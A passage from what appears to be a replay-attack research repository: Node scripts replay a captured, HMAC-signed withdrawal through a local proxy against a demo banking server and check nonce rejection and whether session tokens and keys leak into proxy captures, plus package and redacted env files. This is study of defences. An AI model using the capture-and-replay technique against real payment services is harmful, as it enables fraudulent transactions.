  if (original.body.status !== 'ACCEPTED' || replay.body.reason !== 'NONCE_FAIL') throw new Error('Capture replay did not produce the expected accepted-then-nonce-rejected result');
  const captureHash = crypto.createHash('sha256').update(fs.readFileSync(capturePath)).digest('hex');
  const result = {
    measuredAt: new Date().toISOString(),
    capturePath,
    captureSha256: captureHash,
    capturedRequestMatchedForwardedBody: true,
    attackerReplaySource: 'on-path proxy recording file; no server-written payload file read',
    original: { httpStatus: original.status, outcome: original.body.status, started_ns: original.start_ns, ended_ns: original.end_ns, duration_ns: original.duration_ns },
    replay: { httpStatus: replay.status, reason: replay.body.reason, started_ns: replay.start_ns, ended_ns: replay.end_ns, duration_ns: replay.duration_ns }
  };
  const output = path.join(__dirname, 'results', 'corrections');
  fs.mkdirSync(output, { recursive: true });
  fs.writeFileSync(path.join(output, 'proxy-replay-verification.json'), `${JSON.stringify(result, null, 2)}\n`);
  process.stdout.write(`${JSON.stringify(result, null, 2)}\n`);
}
main().catch((error) => { process.stderr.write(`${error.stack || error.message}\n`); process.exitCode = 1; });
````

## experiments/verify-demo-session-flow.js

````js
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
require('../server/node_modules/dotenv').config({ path: path.resolve(__dirname, '../server/.env') });
const proxy = process.env.PROXY_URL || 'http://127.0.0.1:3002';
const capturePath = process.env.PROXY_CAPTURE_FILE;
if (!capturePath) throw new Error('Set PROXY_CAPTURE_FILE to a private path outside the repository');
async function call(route, options = {}) {
  const response = await fetch(`${proxy}${route}`, options);
  return { status: response.status, body: await response.json() };
}
async function main() {
  const login = await call('/api/login', { method:'POST', headers:{'content-type':'application/json'}, body:JSON.stringify({user_id:'anis_101',pin:process.env.DEMO_PIN || '<REDACTED>'}) });
  if (login.status !== 200) throw new Error(`Login failed with HTTP ${login.status}`);
  const { sessionToken, sessionKey } = login.body;
  const payload = { method:'POST',path:'/api/withdraw',user_id:'anis_101',account_id:'acc_777',amount:1,currency:'BDT',timestamp:new Date().toISOString(),nonce:`demo-${crypto.randomUUID()}`,request_id:`demo-${crypto.randomUUID()}` };
  const canonical = [payload.method,payload.path,payload.user_id,payload.account_id,payload.amount,payload.currency,payload.timestamp,payload.nonce,payload.request_id].join('|');
  payload.signature = crypto.createHmac('sha256', sessionKey).update(canonical).digest('hex');
  const withdrawal = await call('/api/withdraw', { method:'POST',headers:{'content-type':'application/json',authorization:`Bearer ${sessionToken}`},body:JSON.stringify(payload) });
  await Promise.all([
    call('/api/balance/anis_101', {headers:{authorization:`Bearer ${sessionToken}`}}),
    call('/api/transactions/anis_101', {headers:{authorization:`Bearer ${sessionToken}`}})
  ]);
  const capture = JSON.parse(fs.readFileSync(capturePath, 'utf8'));
  const captureRows = fs.readFileSync(`${capturePath}.jsonl`, 'utf8').trim().split(/\r?\n/).map((line) => JSON.parse(line));
  const loginCapture = captureRows.find((row) => row.request.method === 'POST' && row.request.path === '/api/login');
  const generalCapture = JSON.parse(fs.readFileSync(`${capturePath}.withdraw.json`, 'utf8'));
  const capturedBody = typeof generalCapture.request.body === 'string' ? JSON.parse(generalCapture.request.body) : generalCapture.request.body;
  const record = {
    loginHttpStatus: login.status,
    withdrawalHttpStatus: withdrawal.status,
    withdrawalOutcome: withdrawal.body.status || withdrawal.body.reason,
    postWithdrawalRefreshesCompleted: true,
    latestGeneralCapturePath: capture.request.path,
    dedicatedCapturePath: generalCapture.request.path,
    dedicatedCaptureIsWithdrawal: generalCapture.request.method === 'POST' && generalCapture.request.path === '/api/withdraw',
    exactForwardedBodyRecorded: JSON.stringify(capturedBody) === JSON.stringify(payload),
    bearerHeaderCaptured: Boolean(generalCapture.request.headers.authorization),
    requestSignatureCaptured: Boolean(capturedBody.signature),
    sessionKeyWrittenToProxyCapture: Boolean(loginCapture && loginCapture.response.body.includes('sessionKey')),
    sessionTokenWrittenToProxyCapture: Boolean(loginCapture && loginCapture.response.body.includes('sessionToken'))
  };
  if (record.withdrawalOutcome !== 'ACCEPTED' || !record.dedicatedCaptureIsWithdrawal || !record.exactForwardedBodyRecorded) throw new Error('The session withdrawal capture verification failed');
  const output = path.join(__dirname, 'results', 'preparation', 'demo-session-flow.json');
  fs.writeFileSync(output, JSON.stringify(record,null,2)+'\n');
  process.stdout.write(JSON.stringify({output,...record},null,2)+'\n');
}
main().catch((error)=>{ process.stderr.write(`${error.stack||error.message}\n`); process.exitCode=1; });
````

## package.json

````json
{
  "name": "replay-attack-research-artifact",
  "version": "1.0.0",
  "private": true,
  "scripts": {
    "test": "npm --prefix server test"
  }
}
````

## server/package.json

````json
{
  "name": "banking-replay-server",
  "version": "1.0.0",
  "private": true,
  "main": "server.js",
  "scripts": {
    "start": "node server.js",
    "dev": "nodemon server.js",
    "viz": "node viz-server.js",
    "test": "node --test test/*.test.js"
  },
  "dependencies": {
    "cors": "2.8.5",
    "crypto-js": "4.2.0",
    "dotenv": "16.4.5",
    "express": "4.18.2",
    "redis": "4.6.13",
    "socket.io": "4.7.5",
    "sqlite3": "5.1.7"
  },
  "devDependencies": {
    "nodemon": "3.1.4"
  }
}
````

## server/.env.example

````example
HMAC_SECRET=<REDACTED>
PORT=<REDACTED>
HOST=<REDACTED>
VIZ_PORT=<REDACTED>
REDIS_URL=<REDACTED>
SQLITE_DB=<REDACTED>
LEGACY_SHARED_SECRET=<REDACTED>
DEMO_PIN=<REDACTED>
SESSION_TTL=<REDACTED>
VIZ_ENABLED=<REDACTED>
DEMO_MODE=<REDACTED>
TIMESTAMP_PAST_WINDOW_SECONDS=<REDACTED>
TIMESTAMP_FUTURE_WINDOW_SECONDS=<REDACTED>
DEFENSE_HMAC=<REDACTED>
DEFENSE_TIMESTAMP=<REDACTED>
DEFENSE_NONCE=<REDACTED>
DEFENSE_REQUEST_ID=<REDACTED>
CHECK_ORDER=<REDACTED>
NONCE_STORE=<REDACTED>
NONCE_TTL=<REDACTED>
NONCE_STORE_FAIL_MODE=<REDACTED>
DEPOSIT_REPLAY_PROTECTION=<REDACTED>
````
